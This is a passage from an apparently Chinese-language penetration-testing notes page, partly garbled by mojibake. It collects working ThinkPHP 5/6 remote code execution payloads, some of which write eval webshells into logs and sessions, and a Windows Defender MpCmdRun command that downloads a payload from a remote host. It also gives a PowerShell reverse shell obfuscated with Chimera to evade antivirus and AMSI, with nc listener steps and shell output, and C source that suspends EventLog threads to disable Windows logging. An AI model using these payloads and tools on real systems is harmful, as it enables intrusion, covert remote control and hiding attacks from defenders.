åˆ›å»º application/index/view/index/index.html æ–‡ä»¶ï¼Œå†…å®¹éšæ„ï¼ˆæ²¡æœ‰è¿™ä¸ªæ¨¡æ¿æ–‡ä»¶çš„è¯ï¼Œåœ¨æ¸²æŸ“æ—¶ç¨‹åºä¼šæŠ¥é”™ï¼‰ï¼Œå¹¶å°†å›¾ç‰‡é©¬ 1.jpg æ”¾è‡³ public ç›®å½•ä¸‹ï¼ˆæ¨¡æ‹Ÿä¸Šä¼ å›¾ç‰‡æ“ä½œï¼‰ã€‚æ¥ç€è®¿é—®     http://localhost:8000/index/index/index?cacheFile=demo.php é“¾æ¥ï¼Œå³å¯è§¦å‘ æ–‡ä»¶åŒ…å«æ¼æ´ ã€‚
Thinkphp5 ä»£ç æ‰§è¡Œpoc
5.0.0&lt;=ThinkPHP5&lt;=5.0.10
http://localhost/tpdemo/public/?username=mochazz123%0d%0a@eval($_GET[_]);//
http://localhost:8000/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
ThinkPHP &lt;= 5.0.13
POST /?s=index/index
s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system
ThinkPHP &lt;= 5.0.23ã€5.1.0 &lt;= 5.1.16 éœ€è¦å¼€å¯æ¡†æ¶app_debug
POST /
_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al

ThinkPHP &lt;= 5.0.23 éœ€è¦å­˜åœ¨xxxçš„methodè·¯ç”±ï¼Œä¾‹å¦‚captcha
POST /?s=xxx HTTP/1.1
_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al
_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls
å†™shellè¿›æ—¥å¿—
_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;x&#39;])?&gt;
&amp;
å†™shellè¿›session
POST /?s=captcha HTTP/1.1
Cookie: PHPSESSID=kking
_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;x&#39;])?&gt;&amp;server[]=1
&amp;
åŒ…å«session getshell
POST /?s=captcha
_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=tmp\sess_kking&amp;server[]=1
é€šè¿‡æ—¥å¿—åŒ…å«getshell
_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../data/runtime/log/201901/21.log&amp;x=phpinfo();
&amp;
POST /?s=captcha
Cookie: PHPSESSID=kking
_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoJF9HRVRbJ3InXSk7Oz8%2bab&amp;server[]=1
+å·ç”¨urlencodeç¼–ç ä¸º%2bï¼Œå‰ååŠ abä¸ºäº†å‡‘è¶³è§£ç 
/?s=captcha&amp;r=phpinfo();
_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=php://filter/read=convert.base64-decode/resource=c:\www\tmp\sess_kking&amp;server[]=1
&amp;
POST /?s=captcha&amp;r=phpinfo();
Cookie: PHPSESSID=kking
_method=__construct&amp;method=get&amp;filter[]=base64_decode&amp;filter[]=think\__include_file&amp;get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWM6XHd3d1x0bXBcc2Vzc19ra2luZw==&amp;server[]=1
&amp;
è®¾ç½®session
POST /?s=captcha
Cookie: PHPSESSID=kktest

_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&amp;server[]=1
æ–‡ä»¶åŒ…å«
POST /?s=captcha&amp;r=cGhwaW5mbygpOw==

_method=__construct&amp;filter[]=strrev&amp;filter[]=think\__include_file&amp;method=get&amp;server[]=1&amp;get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php
Thinkphp6 ä»»æ„æ–‡ä»¶åˆ›å»º
éœ€å¯æ§sessionå‚æ•°ï¼Œå¦‚username
/index.php?username=&lt;?php phpinfo();?&gt;
Cookie:1234567890123456789012345670.php
Cookieéœ€32ä½
åœ¨runtime\sessionä¸‹ç”Ÿæˆ
sess_1234567890123456789012345670.phpæ–‡ä»¶
</code></pre>
<h2 id="ä½¿ç”¨windows-defenderä¸‹è½½æ–‡ä»¶"><a href="#ä½¿ç”¨windows-defenderä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨windows defenderä¸‹è½½æ–‡ä»¶"></a>ä½¿ç”¨windows defenderä¸‹è½½æ–‡ä»¶</h2><pre><code>C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0&gt;MpCmdRun.exe -DownloadFile -url http://192.168.2.105:8000/payload.c -path c:\\users\\test\\desktop\\1.c
</code></pre>
<p><img src="./img/812.png" alt="image"></p>
<pre><code>å…¶ä»–åˆ©ç”¨
</code></pre>
<p><img src="./img/812-2.png" alt="image"><br><img src="./img/812-3.jfif" alt="image"><br><img src="./img/812-4.jfif" alt="image"></p>
<h2 id="Powershellè„šæœ¬æ··æ·†ç»•è¿‡amsiå’Œav"><a href="#Powershellè„šæœ¬æ··æ·†ç»•è¿‡amsiå’Œav" class="headerlink" title="Powershellè„šæœ¬æ··æ·†ç»•è¿‡amsiå’Œav"></a>Powershellè„šæœ¬æ··æ·†ç»•è¿‡amsiå’Œav</h2><pre><code>https://github.com/tokyoneon/Chimera
ä»¥ä¸‹æ˜¯Invoke-PowerShellTcp.ps1çš„ç‰‡æ®µ
</code></pre>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$stream &#x3D; $client.GetStream()
[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;

#Send back current username and computername
$sendbytes &#x3D; ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;&#96;nCopyright (C) 2015 Microsoft Corporation. All rights reserved.&#96;n&#96;n&quot;)
$stream.Write($sendbytes,0,$sendbytes.Length)

#Show an interactive PowerShell prompt
$sendbytes &#x3D; ([text.encoding]::ASCII).GetBytes(&#39;PS &#39; + (Get-Location).Path + &#39;&gt;&#39;)
$stream.Write($sendbytes,0,$sendbytes.Length)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="./img/813.png" alt="image"></p>
<pre><code>ç»è¿‡Chimeraå¤„ç†å
</code></pre>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># Watched anxiously by the Rebel command, the fleet of small, single-pilot fighters speeds toward the massive, impregnable Death Star.
              $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov &#x3D; $jYODNAbvrcYMGaAnZHZwE.&quot;$bnyEOfzNcZkkuogkqgKbfmmkvB$ZSshncYvoHKvlKTEanAhJkpKSIxQKkTZJBEahFz$KKApRDtjBkYfJhiVUDOlRxLHmOTOraapTALS&quot;()
       # As the station slowly moves into position to obliterate the Rebels, the pilots maneuver down a narrow trench along the stationâ€™s equator, where the thermal port lies hidden.
          [bYte[]]$mOmMDiAfdJwklSzJCUFzcUmjONtNWN &#x3D; 0..65535|%&#123;0&#125;
   # Darth Vader leads the counterattack himself and destroys many of the Rebels, including Lukeâ€™s boyhood friend Biggs, in ship-to-ship combat.

  # Finally, it is up to Luke himself to make a run at the target, and he is saved from Vader at the last minute by Han Solo, who returns in the nick of time and sends Vader spinning away from the station.
           # Heeding Benâ€™s disembodied voice, Luke switches off his computer and uses the Force to guide his aim.
   # Against all odds, Luke succeeds and destroys the Death Star, dealing a major defeat to the Empire and setting himself on the path to becoming a Jedi Knight.
           $PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK &#x3D; ([teXt.enCoDInG]::AsCII).&quot;$mbKdotKJjMWJhAignlHUS$GhPYzrThsgZeBPkkxVKpfNvFPXaYNqOLBm&quot;(&quot;WInDows Powershell rUnnInG As User &quot; + $TgDXkBADxbzEsKLWOwPoF:UsernAMe + &quot; on &quot; + $TgDXkBADxbzEsKLWOwPoF:CoMPUternAMe + &quot;&#96;nCoPYrIGht (C) 2015 MICrosoft CorPorAtIon. All rIGhts reserveD.&#96;n&#96;n&quot;)
# Far off in a distant galaxy, the starship belonging to Princess Leia, a young member of the Imperial Senate, is intercepted in the course of a secret mission by a massive Imperial Star Destroyer.
            $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov.WrIte($PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK,0,$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK.LenGth)
   # An imperial boarding party blasts its way onto the captured vessel, and after a fierce firefight the crew of Leiaâ€™s ship is subdued.
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>VirusTotalæŠ¥å‘Šæ£€æµ‹åˆ°0ä¸ª
</code></pre>
<p><img src="./img/814.png" alt="image"></p>
<pre><code>Kaliä¸‹å®‰è£…
sudo apt-get update &amp;&amp; sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
sudo chmod +x chimera.sh; ./chimera.sh --help
åœ¨shells /ç›®å½•ä¸­æœ‰å‡ ä¸ªNishangè„šæœ¬å’Œä¸€äº›é€šç”¨è„šæœ¬ã€‚æ‰€æœ‰éƒ½å·²ç»è¿‡æµ‹è¯•
ä½¿ç”¨è„šæœ¬ä¹‹å‰ï¼Œè¯·å°†ç¡¬ç¼–ç çš„IPåœ°å€ï¼ˆ192.168.56.101ï¼‰æ›´æ”¹ä¸ºæ‚¨çš„Kaliåœ°å€ã€‚
/opt/chimera$ sed -i &#39;s/192.168.56.101/&lt;YOUR-IP-ADDRESS&gt;/g&#39; shells/*.ps1
æ‰€æœ‰è„šæœ¬çš„é»˜è®¤ç«¯å£ä¸º4444ã€‚å¦‚æœéœ€è¦ï¼Œå†æ¬¡ä½¿ç”¨sedè¿›è¡Œæ›´æ”¹ã€‚
/opt/chimera$ sed -i &#39;s/4444/&lt;YOUR-DESIRED-PORT&gt;/g&#39; shells/*.ps1
fï¼šè¾“å…¥æ–‡ä»¶ã€‚
-oï¼šè¾“å‡ºæ–‡ä»¶ã€‚
-gï¼šä»è„šæœ¬ä¸­çœç•¥å‡ ä¸ªNishangç‰¹å®šçš„ç‰¹å¾ã€‚
-vï¼šæ›¿æ¢å˜é‡åç§°ã€‚
-tï¼šæ›¿æ¢æ•°æ®ç±»å‹ã€‚
-jï¼šæ›¿ä»£å‡½æ•°åç§°ã€‚
-iï¼šåœ¨æ¯ä¸€è¡Œä¸­æ’å…¥ä»»æ„æ³¨é‡Šã€‚
-cï¼šç”¨ä»»æ„æ•°æ®æ›¿æ¢æ³¨é‡Šã€‚
-hï¼šå°†IPåœ°å€è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼ã€‚
-sï¼šæ›¿æ¢å„ç§å­—ç¬¦ä¸²ã€‚
-bï¼šåœ¨å¯èƒ½çš„æƒ…å†µä¸‹åå¼•å·å­—ç¬¦ä¸²ã€‚
-eï¼šè¿‡ç¨‹å®Œæˆåï¼Œæ£€æŸ¥æ··æ·†æ–‡ä»¶ã€‚
ä¸¾ä¾‹ï¼Œncåå¼¹shell
nc -v -l -p 4444
æŠŠæ··æ·†å¥½çš„è„šæœ¬ä¼ å…¥ç›®æ ‡
PS&gt; powershell.exe -ep bypass C:\path\to\chimera.ps1
è·å¾—shell
nc -v -l -p 4444

listening on [any] 4444 ...
192.168.56.105: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.107] from (UNKNOWN) [192.168.56.105] 49725
Windows PowerShell running as user  on
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\target&gt;
ä¸€äº›ä½¿ç”¨è¯´æ˜
https://github.com/tokyoneon/Chimera/blob/master/USAGE.md
</code></pre>
<h2 id="é€šè¿‡æŒ‚èµ·EventLogæœåŠ¡çº¿ç¨‹ç¦ç”¨Windowsäº‹ä»¶æ—¥å¿—"><a href="#é€šè¿‡æŒ‚èµ·EventLogæœåŠ¡çº¿ç¨‹ç¦ç”¨Windowsäº‹ä»¶æ—¥å¿—" class="headerlink" title="é€šè¿‡æŒ‚èµ·EventLogæœåŠ¡çº¿ç¨‹ç¦ç”¨Windowsäº‹ä»¶æ—¥å¿—"></a>é€šè¿‡æŒ‚èµ·EventLogæœåŠ¡çº¿ç¨‹ç¦ç”¨Windowsäº‹ä»¶æ—¥å¿—</h2><pre><code>Windowsäº‹ä»¶æ—¥å¿—ç”±svchost.exeæ‰˜ç®¡å¤„ç†ã€‚EventLog
å¦‚æœæˆ‘ä»¬åˆ—å‡ºsvchostè¿›ç¨‹ï¼Œåˆ™ä¼šçœ‹åˆ°è®¸å¤šè¿™æ ·çš„è¿›ç¨‹ï¼š
</code></pre>
<p><img src="./img/815.png" alt="image"></p>
<pre><code>ä»ä¸Šé¢çš„å±å¹•æˆªå›¾ä¸­ï¼Œå°šä¸æ¸…æ¥šå“ªä¸ªè¿›ç¨‹çœŸæ­£æ‰˜ç®¡äº†è¯¥æœåŠ¡ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ç»§ç»­åœ¨Process Hackerä¸­é€ä¸ªæ£€æŸ¥è¿›ç¨‹ï¼Œæˆ‘ä»¬æœ€ç»ˆå°†æ‰¾åˆ°æ‰˜ç®¡è¯¥æœåŠ¡çš„è¿›ç¨‹ï¼Œå½“å‰ä¸ºpid 2196ï¼šEventLog svchost.exe
</code></pre>
<p><img src="./img/816.png" alt="image"></p>
<pre><code>é€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å¾—eventlogçš„è¿›ç¨‹ID
Get-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId
</code></pre>
<p><img src="./img/817.png" alt="image"></p>
<pre><code>å¦‚æœæˆ‘ä»¬æŸ¥çœ‹çš„svchost.exeçº¿ç¨‹ï¼Œåˆ™ä¼šçœ‹åˆ°
</code></pre>
<p><img src="./img/818.png" alt="image"></p>
<pre><code>ä¸‹é¢æ˜¾ç¤ºçš„æ˜¯ï¼Œç¡®å®ï¼Œæš‚åœè¶³ä»¥ä½¿EventLogæœåŠ¡æ— æ³•æ³¨å†Œä»»ä½•æ–°äº‹ä»¶ï¼š
æ²¡æœ‰æŒ‚èµ·æ—¶ä¿®æ”¹ä¸ªå¯†ç 
</code></pre>
<p><img src="./img/819.png" alt="image"></p>
<pre><code>ä¼šæ³¨å†Œæ–°çš„äº‹ä»¶
æŒ‚èµ·æ—¶åˆ™æ²¡æœ‰æ–°çš„äº‹ä»¶
</code></pre>
<p><img src="./img/820.png" alt="image"></p>
<pre><code>ä»£ç å®ç°
ä¸‹é¢æ˜¯åœ¨è¾ƒé«˜çº§åˆ«ä¸‹å·¥ä½œçš„æŠ€æœ¯ä»£ç ï¼š
1.ä½¿ç”¨OpenSCManagerAå‘½ä»¤æ‰“å¼€æœåŠ¡æ§åˆ¶ç®¡ç†å™¨çš„å¥æŸ„ 
2.ä½¿ç”¨OpenServiceAå‘½ä»¤æ‰“å¼€EventLogæœåŠ¡çš„å¥æŸ„ 
3.ä½¿ç”¨QueryServiceStatusExå‘½ä»¤æ£€ç´¢svchost.exeï¼ˆæ‰˜ç®¡EventLogï¼‰è¿›ç¨‹ID
4.æ‰“å¼€svchost.exeè¿›ç¨‹çš„å¥æŸ„ï¼ˆä»ç¬¬3æ­¥å¼€å§‹ï¼‰
5.è·å–ç”±svchost.exeåŠ è½½çš„å·²åŠ è½½æ¨¡å—çš„åˆ—è¡¨ EnumProcessModules
6.å¾ªç¯æµè§ˆåœ¨æ­¥éª¤5ä¸­æ£€ç´¢åˆ°çš„å·²åŠ è½½æ¨¡å—åˆ—è¡¨ï¼Œä½¿ç”¨æŸ¥æ‰¾å…¶åç§°å¹¶æ‰¾åˆ°æ¨¡å—çš„åŸºåœ°å€-è¿™æ˜¯åŒ…å«æœåŠ¡å†…éƒ¨å·¥ä½œçš„æ¨¡å—
7.è·å–æ¨¡å—ä¿¡æ¯ã€‚å®ƒå°†è¿”å›å¸¦æœ‰æ¨¡å—çš„èµ·å§‹åœ°å€-æˆ‘ä»¬ç¨åå°†åœ¨ç¡®å®šæœåŠ¡çº¿ç¨‹æ˜¯å¦è½å…¥wevtsvc.dllæ¨¡å—çš„å†…å­˜ç©ºé—´æ—¶éœ€è¦è¿™äº›è¯¦ç»†ä¿¡æ¯wevtsvc.dll   GetModuleInformation EventLog
8.æšä¸¾svchost.exeå†…çš„æ‰€æœ‰çº¿ç¨‹ã€‚Thread32FirstThread32Next
9.å¯¹äºæ­¥éª¤8ä¸­çš„æ¯ä¸ªçº¿ç¨‹ï¼Œä½¿ç”¨NtQueryInformationThreadå‘½ä»¤æ£€ç´¢çº¿ç¨‹çš„èµ·å§‹åœ°å€ 
10.å¯¹äºæ­¥éª¤8ä¸­çš„æ¯ä¸ªçº¿ç¨‹ï¼Œæ£€æŸ¥çº¿ç¨‹çš„èµ·å§‹åœ°å€æ˜¯å¦å±äºsvchost.exeå†…éƒ¨çš„å†…å­˜ç©ºé—´ã€‚wevtsvc.dll
11.å¦‚æœçº¿ç¨‹çš„èµ·å§‹åœ°å€åœ¨å†…å­˜ç©ºé—´å†…ï¼Œåˆ™è¿™æ˜¯æˆ‘ä»¬çš„ç›®æ ‡çº¿ç¨‹ï¼Œæˆ‘ä»¬å°†å…¶æŒ‚èµ·wevtsvc.dll SuspendThread
12.EventLog æœåŠ¡ç°å·²ç¦ç”¨
</code></pre>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Psapi.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;TlHelp32.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dbghelp.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;winternl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> </span><span class="token string">"DbgHelp"</span><span class="token expression"><span class="token punctuation">)</span></span></span>
using myNtQueryInformationThread <span class="token operator">=</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>NTAPI<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>
IN HANDLE ThreadHandle<span class="token punctuation">,</span>
IN THREADINFOCLASS ThreadInformationClass<span class="token punctuation">,</span>
OUT PVOID ThreadInformation<span class="token punctuation">,</span>
IN ULONG ThreadInformationLength<span class="token punctuation">,</span>
OUT PULONG ReturnLength
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
HANDLE serviceProcessHandle<span class="token punctuation">;</span>
HANDLE snapshotHandle<span class="token punctuation">;</span>
HANDLE threadHandle<span class="token punctuation">;</span>
HMODULE modules<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
SIZE_T modulesSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>modules<span class="token punctuation">)</span><span class="token punctuation">;</span>
DWORD modulesSizeNeeded <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
DWORD moduleNameSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
SIZE_T modulesCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
WCHAR remoteModuleName<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
HMODULE serviceModule <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
MODULEINFO serviceModuleInfo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
DWORD_PTR threadStartAddress <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
DWORD bytesNeeded <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
myNtQueryInformationThread NtQueryInformationThread <span class="token operator">=</span> <span class="token punctuation">(</span>myNtQueryInformationThread<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationThread"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
THREADENTRY32 threadEntry<span class="token punctuation">;</span>
threadEntry<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>THREADENTRY32<span class="token punctuation">)</span><span class="token punctuation">;</span>
SC_HANDLE sc <span class="token operator">=</span> <span class="token function">OpenSCManagerA</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> MAXIMUM_ALLOWED<span class="token punctuation">)</span><span class="token punctuation">;</span>
SC_HANDLE service <span class="token operator">=</span> <span class="token function">OpenServiceA</span><span class="token punctuation">(</span>sc<span class="token punctuation">,</span> <span class="token string">"EventLog"</span><span class="token punctuation">,</span> MAXIMUM_ALLOWED<span class="token punctuation">)</span><span class="token punctuation">;</span>
SERVICE_STATUS_PROCESS serviceStatusProcess <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Get PID of svchost<span class="token punctuation">.</span>exe that hosts EventLog service</span></span>
<span class="token function">QueryServiceStatusEx</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> SC_STATUS_PROCESS_INFO<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span><span class="token operator">&amp;</span>serviceStatusProcess<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>serviceStatusProcess<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesNeeded<span class="token punctuation">)</span><span class="token punctuation">;</span>
DWORD servicePID <span class="token operator">=</span> serviceStatusProcess<span class="token punctuation">.</span>dwProcessId<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Open handle to the svchost<span class="token punctuation">.</span>exe</span></span>
serviceProcessHandle <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>MAXIMUM_ALLOWED<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> servicePID<span class="token punctuation">)</span><span class="token punctuation">;</span>
snapshotHandle <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPTHREAD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Get a list of modules loaded by svchost<span class="token punctuation">.</span>exe</span></span>
<span class="token function">EnumProcessModules</span><span class="token punctuation">(</span>serviceProcessHandle<span class="token punctuation">,</span> modules<span class="token punctuation">,</span> modulesSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>modulesSizeNeeded<span class="token punctuation">)</span><span class="token punctuation">;</span>
modulesCount <span class="token operator">=</span> modulesSizeNeeded <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>HMODULE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> modulesCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
serviceModule <span class="token operator">=</span> modules<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Get loaded module's name</span></span>
<span class="token function">GetModuleBaseName</span><span class="token punctuation">(</span>serviceProcessHandle<span class="token punctuation">,</span> serviceModule<span class="token punctuation">,</span> remoteModuleName<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>remoteModuleName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">wcscmp</span><span class="token punctuation">(</span>remoteModuleName<span class="token punctuation">,</span> L<span class="token string">"wevtsvc.dll"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Windows EventLog module %S at %p\n\n"</span><span class="token punctuation">,</span> remoteModuleName<span class="token punctuation">,</span> serviceModule<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">GetModuleInformation</span><span class="token punctuation">(</span>serviceProcessHandle<span class="token punctuation">,</span> serviceModule<span class="token punctuation">,</span> <span class="token operator">&amp;</span>serviceModuleInfo<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>MODULEINFO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Enumerate threads</span></span>
<span class="token function">Thread32First</span><span class="token punctuation">(</span>snapshotHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>threadEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Thread32Next</span><span class="token punctuation">(</span>snapshotHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>threadEntry<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>threadEntry<span class="token punctuation">.</span>th32OwnerProcessID <span class="token operator">==</span> servicePID<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
threadHandle <span class="token operator">=</span> <span class="token function">OpenThread</span><span class="token punctuation">(</span>MAXIMUM_ALLOWED<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> threadEntry<span class="token punctuation">.</span>th32ThreadID<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">NtQueryInformationThread</span><span class="token punctuation">(</span>threadHandle<span class="token punctuation">,</span> <span class="token punctuation">(</span>THREADINFOCLASS<span class="token punctuation">)</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>threadStartAddress<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Check <span class="token keyword">if</span> thread's start address is inside wevtsvc<span class="token punctuation">.</span>dll memory range</span></span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>threadStartAddress <span class="token operator">>=</span> <span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span>serviceModuleInfo<span class="token punctuation">.</span>lpBaseOfDll <span class="token operator">&amp;&amp;</span> threadStartAddress <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span>serviceModuleInfo<span class="token punctuation">.</span>lpBaseOfDll <span class="token operator">+</span> serviceModuleInfo<span class="token punctuation">.</span>SizeOfImage<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Suspending EventLog thread %d with start address %p\n"</span><span class="token punctuation">,</span> threadEntry<span class="token punctuation">.</span>th32ThreadID<span class="token punctuation">,</span> threadStartAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Suspend EventLog service thread</span></span>
<span class="token function">SuspendThread</span><span class="token punctuation">(</span>threadHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
